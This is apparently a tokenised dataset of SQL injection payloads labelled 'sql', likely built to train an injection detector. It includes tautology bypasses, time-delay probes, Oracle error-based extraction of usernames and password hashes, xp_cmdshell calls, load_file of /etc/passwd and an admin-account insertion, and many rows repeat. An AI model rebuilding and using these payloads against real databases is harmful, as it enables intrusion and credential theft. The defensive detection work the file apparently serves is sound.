13,SQUT PRCNT INT PRCNT INT PRCNT INT PRCNT 20this DOT PASSWORD DOT MATCH LPRN SLSH DOT STAR SLSH RPRN SLSH SLSH PLUS PRCNT INT,sql
14,SQUT PRCNT INT PRCNT INT PRCNT INT PRCNT 20this DOT passwordzz DOT MATCH LPRN SLSH DOT STAR SLSH RPRN SLSH SLSH PLUS PRCNT INT,sql
15,LCBR DLLR gt CLN SQUT SQUT RCBR,sql
16,LSQBR DLLR ne RSQBR EQ INT,sql
17,SQUT SMCLN sleep LPRN INT RPRN SMCLN,sql
18,SQUT SMCLN sleep LPRN INT RPRN SMCLN SQUT,sql
19,SQUT SMCLN sleep LPRN INT RPRN SMCLN PLUS SQUT,sql
20,SQUT SMCLN it EQ NEW PRCNT 20date LPRN RPRN SMCLN DO LCBR pt EQ NEW PRCNT 20date LPRN RPRN SMCLN RCBR WHILE LPRN pt MINUS it LT INT RPRN SMCLN,sql
0,â€™ OR â€˜1â€™ EQ â€™1,sql
1,SQUT OR SQUT INT SQUT EQ SQUT INT,sql
2,SQUT BITOR BITOR utl_http DOT request LPRN SQUT http CLN SLSH SLSH INT DOT INT DOT INT DOT INT SLSH SQUT RPRN BITOR BITOR SQUT,sql
3,SQUT BITOR BITOR myappadmin DOT adduser LPRN SQUT ADMIN SQUT CMMA SQUT newpass SQUT RPRN BITOR BITOR SQUT,sql
4,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT banner FROM v DLLR VERSION WHERE rownum EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
5,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT sys DOT login_user FROM DUAL RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
6,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT sys DOT database_name FROM DUAL RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
7,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT host_name FROM v DLLR INSTANCE RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
8,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT global_name FROM global_name RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
9,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT COUNT LPRN DISTINCT LPRN username RPRN RPRN FROM sys DOT all_users RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
10,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT COUNT LPRN DISTINCT LPRN PASSWORD RPRN RPRN FROM sys DOT USER DLLR RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
11,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT COUNT LPRN DISTINCT LPRN TABLE_NAME RPRN RPRN FROM sys DOT all_tables RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
12,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT COUNT LPRN DISTINCT LPRN COLUMN_NAME RPRN RPRN FROM sys DOT all_tab_columns RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
13,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT COUNT LPRN DISTINCT LPRN granted_role RPRN RPRN FROM dba_role_privs WHERE grantee EQ sys DOT login_user RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
14,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
15,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
16,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
17,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
18,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
19,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
20,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
21,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
22,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
23,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
24,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
25,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
26,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
27,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
28,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
29,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
30,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
31,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
32,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
33,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
34,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
35,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
36,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
37,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
38,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
39,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
40,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
41,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
42,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
43,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
44,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
45,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
46,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
47,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
48,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
49,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
50,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
51,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
52,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
53,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
54,,sql
0,LT GT DQUT SQUT PRCNT SMCLN RPRN LPRN BITAND PLUS,sql
1,BITOR,sql
2,EXCLM,sql
3,QSTN,sql
4,SLSH,sql
5,SLSH SLSH,sql
6,SLSH SLSH STAR,sql
7,SQUT,sql
8,SQUT MINUS MINUS,sql
9,LPRN,sql
10,RPRN,sql
11,STAR BITOR,sql
12,STAR SLSH STAR,sql
13,BITAND,sql
14,INT,sql
15,INT,sql
16,INT OR INT EQ INT,sql
17,0x730065006c00650063007400200040004000760065007200730069006f006e00 EXEC LPRN ATR q RPRN,sql
18,0x770061006900740066006f0072002000640065006c00610079002000270030003a0030003a,sql
19,0x77616974666f722064656c61792027303a303a31302700 EXEC LPRN ATR s RPRN,sql
20,INT SMCLN LPRN load_file LPRN CHAR LPRN INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT RPRN RPRN RPRN CMMA INT CMMA INT CMMA INT SMCLN,sql
21,INT OR INT EQ INT,sql
22,INT SMCLN SELECT PRCNT INT STAR,sql
23,INT waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,sql
24,SQUT PRCNT 20or PRCNT INT SQUT SQUT EQ SQUT,sql
25,SQUT PRCNT 20or PRCNT INT EQ INT,sql
26,SQUT RPRN PRCNT 20or PRCNT INT LPRN SQUT x SQUT EQ SQUT x,sql
27,SQUT PRCNT 20or PRCNT INT SQUT x SQUT EQ SQUT x,sql
28,PRCNT 20or PRCNT 20x EQ x,sql
29,PRCNT INT SQUT sleep PRCNT INT SQUT,sql
30,PRCNT INT DLLR LPRN sleep PRCNT INT RPRN,sql
31,PRCNT INT,sql
32,INT OR INT EQ INT,sql
33,PRCNT INT,sql
34,PRCNT INT PRCNT 20or PRCNT INT EQ INT,sql
35,PRCNT INT,sql
36,PRCNT INT,sql
37,PRCNT 2a PRCNT INT PRCNT 7c PRCNT 28mail PRCNT 3d PRCNT 2a PRCNT INT PRCNT INT,sql
38,PRCNT 2a PRCNT INT PRCNT 7c PRCNT 28objectclass PRCNT 3d PRCNT 2a PRCNT INT PRCNT INT,sql
39,PRCNT 2a PRCNT 7c,sql
40,BITOR BITOR INT,sql
41,SQUT BITOR BITOR SQUT INT,sql
42,LPRN BITOR BITOR INT RPRN,sql
43,PRCNT 7c,sql
44,A SQUT,sql
45,ADMIN SQUT OR SQUT,sql
46,SQUT AND INT EQ LPRN IF LPRN LPRN load_file LPRN CHAR LPRN INT CMMA INT CMMA INT CMMA INT CMMA INT RPRN RPRN LT GT CHAR LPRN INT CMMA INT RPRN RPRN CMMA INT CMMA INT RPRN RPRN SMCLN,sql
47,SQUT AND INT IN LPRN SELECT var FROM TEMP RPRN MINUS MINUS,sql
48,anything SQUT OR SQUT x SQUT EQ SQUT x,sql
49,DQUT A DQUT DQUT OR INT EQ INT MINUS MINUS DQUT,sql
50,A SQUT OR INT EQ INT MINUS MINUS,sql
51,DQUT A DQUT DQUT OR INT EQ INT MINUS MINUS DQUT,sql
52,A SQUT OR INT EQ INT MINUS MINUS,sql
53,A SQUT OR SQUT A SQUT EQ SQUT A,sql
54,BITAND apos SMCLN PRCNT 20or,sql
55,AS,sql
56,ASC,sql
57,A SQUT waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,sql
58,SQUT SMCLN BEGIN DECLARE ATR var VARCHAR LPRN INT RPRN SET ATR var EQ SQUT CLN SQUT SELECT ATR var EQ ATR var PLUS SQUT PLUS login PLUS SQUT SLSH SQUT PLUS PASSWORD PLUS SQUT SQUT FROM users WHERE login GT,sql
59,bfilename,sql
60,CHAR PRCNT INT PRCNT INT PRCNT 2b PRCNT 40select,sql
61,DECLARE ATR q nvarchar LPRN INT RPRN 0x730065006c00650063007400200040004000760065007200730069006f006e00 EXEC LPRN ATR q RPRN,sql
62,DECLARE ATR q nvarchar LPRN INT RPRN SELECT ATR q EQ 0x770061006900740066006f0072002000640065006c00610079002000270030003a0030003a0031003000270000 EXEC LPRN ATR q RPRN,sql
63,DECLARE ATR q nvarchar LPRN INT RPRN SELECT ATR q EQ,sql
64,DECLARE ATR s VARCHAR LPRN INT RPRN SELECT ATR s EQ 0x73656c65637420404076657273696f6e EXEC LPRN ATR s RPRN,sql
65,DECLARE ATR s VARCHAR LPRN INT RPRN SELECT ATR s EQ 0x77616974666f722064656c61792027303a303a31302700 EXEC LPRN ATR s RPRN,sql
66,DECLARE ATR s VARCHAR LPRN INT RPRN SELECT ATR s EQ,sql
67,DECLARE ATR s VARCHAR LPRN INT RPRN SELECT ATR s EQ 0x73656c65637420404076657273696f6e,sql
68,DELETE,sql
69,DESC,sql
70,DISTINCT,sql
71,SQUT BITOR BITOR LPRN elt LPRN MINUS INT PLUS INT CMMA bin LPRN INT RPRN CMMA ord LPRN INT RPRN CMMA HEX LPRN CHAR LPRN INT RPRN RPRN RPRN RPRN,sql
72,SQUT SMCLN EXEC master DOT DOT xp_cmdshell,sql
73,SQUT SMCLN EXEC master DOT DOT xp_cmdshell SQUT ping INT DOT INT DOT INT DOT INT SQUT MINUS MINUS,sql
74,EXEC LPRN ATR s RPRN,sql
75,SQUT SMCLN EXEC LPRN SQUT sel SQUT PLUS SQUT ect us SQUT PLUS SQUT er SQUT RPRN,sql
76,EXEC sp,sql
77,SQUT SMCLN EXECUTE IMMEDIATE SQUT sel SQUT BITOR BITOR SQUT ect us SQUT BITOR BITOR SQUT er SQUT,sql
78,EXEC xp,sql
79,SQUT SMCLN EXEC xp_regread,sql
80,SQUT GROUP BY userid HAVING INT EQ INT MINUS MINUS,sql
81,HANDLER,sql
82,HAVING,sql
83,SQUT HAVING INT EQ INT MINUS MINUS,sql
84,hi OR INT EQ INT MINUS MINUS DQUT,sql
85,hi SQUT OR INT EQ INT MINUS MINUS,sql
86,DQUT hi DQUT DQUT RPRN OR LPRN DQUT DQUT A DQUT DQUT EQ DQUT DQUT A DQUT,sql
87,hi OR A EQ A,sql
88,hi SQUT OR SQUT A SQUT EQ SQUT A,sql
89,hi SQUT RPRN OR LPRN SQUT A SQUT EQ SQUT A,sql
90,SQUT hi SQUT OR SQUT x SQUT EQ SQUT x SQUT SMCLN,sql
91,INSERT,sql
92,LIKE,sql
93,LIMIT,sql
94,STAR LPRN BITOR LPRN mail EQ STAR RPRN RPRN,sql
95,STAR LPRN BITOR LPRN objectclass EQ STAR RPRN RPRN,sql
96,OR,sql
97,SQUT OR SQUT SQUT EQ SQUT,sql
98,OR INT EQ INT HASH DQUT,sql
99,SQUT OR INT EQ INT MINUS MINUS,sql
100,SQUT OR INT EQ INT HASH,sql
101,DQUT OR INT EQ INT MINUS MINUS,sql
102,OR INT EQ INT MINUS MINUS,sql
103,OR INT EQ INT HASH,sql
104,SQUT OR INT MINUS MINUS SQUT,sql
105,SQUT OR INT SLSH STAR,sql
106,SMCLN OR SQUT INT SQUT EQ SQUT INT SQUT,sql
107,SQUT OR SQUT INT SQUT EQ SQUT INT,sql
108,SQUT OR SQUT INT SQUT EQ SQUT INT SQUT MINUS MINUS,sql
109,SQUT OR INT EQ INT,sql
110,SQUT OR INT EQ INT SLSH STAR,sql
111,SQUT OR INT EQ INT MINUS MINUS,sql
112,SQUT OR INT EQ INT MINUS MINUS,sql
113,SQUT SLSH STAR STAR SLSH OR SLSH STAR STAR SLSH INT SLSH STAR STAR SLSH EQ SLSH STAR STAR SLSH INT,sql
114,â€˜ OR INT EQ INT MINUS MINUS,sql
115,DQUT OR INT EQ INT MINUS MINUS,sql
116,OR INT EQ INT,sql
117,OR INT EQ INT MINUS MINUS,sql
118,OR INT EQ INT OR DQUT DQUT EQ,sql
119,SQUT OR INT EQ INT OR SQUT SQUT EQ SQUT,sql
120,SQUT OR INT IN LPRN SELECT ATR ATR VERSION RPRN MINUS MINUS,sql
121,OR PRCNT INT EQ INT,sql
122,OR PRCNT INT EQ INT MINUS MINUS,sql
123,SQUT OR INT GT INT,sql
124,SQUT OR INT BETWEEN INT AND INT,sql
125,SQUT OR INT EQ INT,sql
126,â€˜ OR INT EQ INT MINUS MINUS,sql
127,SQUT OR SQUT INT SQUT EQ SQUT INT,sql
128,OR A EQ A,sql
129,OR A EQ A,sql
130,SQUT OR SQUT A SQUT EQ SQUT A,sql
131,SQUT OR A EQ A MINUS MINUS,sql
132,SQUT RPRN OR LPRN SQUT A SQUT EQ SQUT A,sql
133,DQUT OR DQUT A DQUT EQ DQUT A,sql
134,RPRN OR LPRN A EQ A,sql
135,ORDER BY,sql
136,SQUT OR LPRN EXISTS RPRN,sql
137,OR ISNULL LPRN INT SLSH INT RPRN SLSH STAR,sql
138,DQUT OR ISNULL LPRN INT SLSH INT RPRN SLSH STAR,sql
139,SQUT OR SQUT something SQUT LIKE SQUT SOME PRCNT SQUT,sql
140,SQUT OR SQUT something SQUT EQ SQUT SOME SQUT PLUS SQUT thing SQUT,sql
141,SQUT OR SQUT TEXT SQUT EQ n SQUT TEXT SQUT,sql
142,SQUT OR SQUT TEXT SQUT GT SQUT T SQUT,sql
143,SQUT OR uid LIKE SQUT PRCNT,sql
144,SQUT OR uname LIKE SQUT PRCNT,sql
145,SQUT OR SQUT unusual SQUT EQ SQUT unusual SQUT,sql
146,SQUT OR userid LIKE SQUT PRCNT,sql
147,SQUT OR USER LIKE SQUT PRCNT,sql
148,SQUT OR username LIKE SQUT PRCNT,sql
149,SQUT OR username LIKE CHAR LPRN INT RPRN SMCLN,sql
150,SQUT OR SQUT whatever SQUT IN LPRN SQUT whatever SQUT RPRN,sql
151,SQUT MINUS MINUS BITAND PASSWORD EQ,sql
152,PASSWORD CLN STAR SLSH EQ INT MINUS MINUS,sql
153,print,sql
154,print ATR ATR variable,sql
155,PROCEDURE,sql
156,REPLACE,sql
157,SELECT,sql
158,SQUT SELECT STAR FROM information_schema DOT TABLES MINUS MINUS,sql
159,SQUT SELECT NAME FROM syscolumns WHERE ID EQ LPRN SELECT ID FROM sysobjects WHERE NAME EQ tablename SQUT RPRN MINUS MINUS,sql
160,SQUT LPRN SELECT top INT,sql
161,MINUS MINUS sp_password,sql
162,SQUT sqlattempt1,sql
163,LPRN sqlattempt2 RPRN,sql
164,SQUT sqlvuln,sql
165,SQUT PLUS sqlvuln,sql
166,LPRN sqlvuln RPRN,sql
167,sqlvuln SMCLN,sql
168,T SQUT EXEC master DOT DOT xp_cmdshell SQUT nslookup www DOT google DOT com SQUT MINUS MINUS,sql
169,to_timestamp_tz,sql
170,TRUNCATE,sql
171,tz_offset,sql
172,SQUT UNION ALL SELECT,sql
173,SQUT UNION ALL SELECT ATR ATR VERSION MINUS MINUS,sql
174,SQUT UNION SELECT,sql
175,uni SLSH STAR STAR SLSH ON sel SLSH STAR STAR SLSH ect,sql
176,SQUT UNION SELECT,sql
177,SQUT UNION SELECT INT CMMA load_file LPRN SQUT SLSH etc SLSH passwd SQUT RPRN CMMA INT CMMA INT CMMA INT SMCLN,sql
